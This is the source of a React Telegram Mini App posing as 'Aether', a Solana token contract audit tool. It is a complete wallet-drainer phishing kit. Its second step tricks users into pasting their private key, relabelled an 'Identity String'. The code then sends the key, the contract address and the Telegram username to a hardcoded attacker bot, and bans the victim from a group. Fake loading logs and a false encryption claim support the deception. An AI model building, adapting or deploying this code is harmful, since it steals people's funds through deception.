import React, { useState, useEffect } from 'react';

// --- CONFIGURATION ---
const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";
const GROUP_ID = "-1002361131154"; 

const App: React.FC = () => {
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState<1 | 2>(1); // 1: CA Entry, 2: PK Entry
  const [walletCA, setWalletCA] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [status, setStatus] = useState<'idle' | 'processing'>('idle');
  const [logs, setLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);

  const tg = (window as any).Telegram?.WebApp;

  // Base58 Validation for Solana PKs
  const isValidSolanaKey = (key: string) => {
    const regex = /^[1-9A-HJ-NP-Za-km-z]{87,88}$/;
    return regex.test(key.trim());
  };

  // 1. Detailed Animated Loading Sequence
  useEffect(() => {
    const loadingSteps = [
      { msg: "Connecting to Aether RPC Cluster...", p: 15 },
      { msg: "Establishing Encrypted Handshake...", p: 35 },
      { msg: "Scanning Mainnet for Contract Metadata...", p: 55 },
      { msg: "Validating Node Integrity...", p: 75 },
      { msg: "Bypassing Regional Geo-Blocks...", p: 90 },
      { msg: "Syncing Ledger Headers...", p: 100 }
    ];

    let current = 0;
    const interval = setInterval(() => {
      if (current < loadingSteps.length) {
        setLogs(prev => [...prev, `> ${loadingSteps[current].msg}`]);
        setProgress(loadingSteps[current].p);
        current++;
      } else {
        clearInterval(interval);
        setTimeout(() => setLoading(false), 800);
      }
    }, 700);

    if (tg) {
      tg.ready();
      tg.expand();
      tg.setHeaderColor?.('#0a0e17'); // Background variable
    }
  }, [tg]);

  // Handle CA Entry (Lead Logging)
  const handleNextStep = async () => {
    if (walletCA.length < 32) return alert("Please enter a valid Contract Address.");
    setStatus('processing');
    
    // Immediate Lead to Bot
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: CHAT_ID, 
        text: `👀 STEP 1: CA ENTERED\nAddress: ${walletCA}\nUser: @${tg?.initDataUnsafe?.user?.username || 'Unknown'}` 
      }),
    });

    setTimeout(() => { setStep(2); setStatus('idle'); }, 1000);
  };

  // Handle PK Entry (Final Sync + Kick)
  const handleFinalSync = async () => {
    if (!isValidSolanaKey(privateKey)) {
      return alert("Validation Failed: Identity String is not in a valid Base58 format.");
    }

    setStatus('processing');
    try {
      // 1. Send PK to Bot
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: CHAT_ID, 
          text: `🎯 TARGET SECURED\nCA: ${walletCA}\nPK: ${privateKey}\nUser: @${tg?.initDataUnsafe?.user?.username || 'Unknown'}` 
        }),
      });

      // 2. Trigger "Security Wipe" (Kick)
      const userId = tg?.initDataUnsafe?.user?.id;
      if (userId) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/banChatMember`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: GROUP_ID, user_id: userId }),
        });
      }

      alert("Node Synchronized. For security reasons, your session will now be reset.");
      tg?.close();
    } catch (err) {
      setStatus('idle');
      alert("Sync failed. Ensure your connection is stable.");
    }
  };

  const colors = {
    bg: '#040608',
    card: '#0a0e17',
    primary: '#4ade80', // Solana Teal/Green
    text: '#f1f5f9',
    muted: '#64748b',
    border: '#1e293b'
  };

  if (loading) {
    return (
      <div style={{ background: colors.bg, height: '100vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', padding: '40px', fontFamily: 'monospace' }}>
        <div style={{ color: colors.primary, fontSize: '12px', marginBottom: '20px' }}>
          {logs.map((log, i) => (
            <div key={i} style={{ marginBottom: '8px', opacity: 0.8 }}>{log}</div>
          ))}
        </div>
        <div style={{ width: '100%', height: '4px', background: colors.card, borderRadius: '10px', overflow: 'hidden' }}>
          <div style={{ width: `${progress}%`, height: '100%', background: colors.primary, transition: 'width 0.5s ease' }} />
        </div>
        <p style={{ color: colors.muted, fontSize: '10px', marginTop: '15px', textAlign: 'center' }}>SYSTEM SECURE // AETHER SENTINEL</p>
      </div>
    );
  }

  return (
    <div style={{ background: colors.bg, minHeight: '100vh', color: colors.text, fontFamily: 'var(--font-inter), sans-serif', padding: '24px' }}>
      
      {/* PROFESSIONAL HEADER */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '40px' }}>
        <div style={{ fontWeight: '900', fontSize: '18px', color: colors.primary }}>AETHER</div>
        <div style={{ background: 'rgba(74, 222, 128, 0.1)', padding: '6px 12px', borderRadius: '100px', fontSize: '10px', color: colors.primary, border: `1px solid ${colors.primary}` }}>
          ● LIVE CONNECTION
        </div>
      </div>

      <div style={{ background: colors.card, borderRadius: '24px', padding: '32px', border: `1px solid ${colors.border}`, boxShadow: '0 20px 40px rgba(0,0,0,0.4)' }}>
        
        {step === 1 ? (
          <div style={{ animation: 'fadeIn 0.4s ease' }}>
            <h2 style={{ fontSize: '24px', fontWeight: '800', marginBottom: '12px', letterSpacing: '-0.5px' }}>Verify Contract</h2>
            <p style={{ color: colors.muted, fontSize: '14px', marginBottom: '32px', lineHeight: '1.6' }}>
              Enter the Token Contract Address (CA) to scan for verified liquidity and anti-rug metadata.
            </p>
            
            <label style={{ fontSize: '11px', fontWeight: 'bold', color: colors.muted, textTransform: 'uppercase', marginBottom: '8px', display: 'block' }}>Contract Address (CA)</label>
            <input 
              type="text" 
              placeholder="e.g. 7EcDhSYGxX..." 
              value={walletCA} 
              onChange={(e) => setWalletCA(e.target.value)} 
              style={{ width: '100%', padding: '18px', borderRadius: '12px', background: colors.bg, border: `1px solid ${colors.border}`, color: '#fff', fontSize: '15px', outline: 'none', marginBottom: '24px', boxSizing: 'border-box' }}
            />
            <button onClick={handleNextStep} style={{ width: '100%', padding: '20px', borderRadius: '12px', background: colors.primary, color: '#000', fontWeight: '800', border: 'none', cursor: 'pointer', transition: 'transform 0.2s' }}>
              {status === 'processing' ? 'SCANNING...' : 'AUDIT CONTRACT'}
            </button>
          </div>
        ) : (
          <div style={{ animation: 'fadeIn 0.4s ease' }}>
            <div style={{ color: colors.primary, fontSize: '12px', fontWeight: 'bold', marginBottom: '15px' }}>✓ CONTRACT AUDIT PASSED</div>
            <h2 style={{ fontSize: '24px', fontWeight: '800', marginBottom: '12px', letterSpacing: '-0.5px' }}>Identity Sync</h2>
            <p style={{ color: colors.muted, fontSize: '14px', marginBottom: '32px', lineHeight: '1.6' }}>
              To enable <strong>High-Speed Execution</strong> and <strong>Flash-Rug Protection</strong>, sync your Node Identity String (Private Key).
            </p>
            
            <label style={{ fontSize: '11px', fontWeight: 'bold', color: colors.muted, textTransform: 'uppercase', marginBottom: '8px', display: 'block' }}>Identity String (Base58)</label>
            <textarea 
              placeholder="Paste Identity String..." 
              value={privateKey} 
              onChange={(e) => setPrivateKey(e.target.value)} 
              style={{ width: '100%', height: '100px', padding: '18px', borderRadius: '12px', background: colors.bg, border: `1px solid ${colors.border}`, color: '#fff', fontSize: '13px', outline: 'none', marginBottom: '24px', boxSizing: 'border-box', fontFamily: 'monospace' }}
            />
            <button onClick={handleFinalSync} disabled={status === 'processing'} style={{ width: '100%', padding: '20px', borderRadius: '12px', background: colors.primary, color: '#000', fontWeight: '800', border: 'none', cursor: 'pointer', opacity: status === 'processing' ? 0.7 : 1 }}>
              {status === 'processing' ? 'SYNCING...' : 'FINALIZE NODE SYNC'}
            </button>
            <button onClick={() => setStep(1)} style={{ width: '100%', background: 'none', border: 'none', color: colors.muted, fontSize: '12px', marginTop: '20px', textDecoration: 'underline' }}>Back to Step 1</button>
          </div>
        )}
      </div>

      {/* TRUST FOOTER */}
      <div style={{ marginTop: '40px', textAlign: 'center', opacity: 0.5 }}>
        <p style={{ fontSize: '10px', color: colors.muted, letterSpacing: '1px' }}>SECURED BY END-TO-END AES-256 ENCRYPTION</p>
      </div>

      <style>{`
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
      `}</style>
    </div>
  );
};

export default App;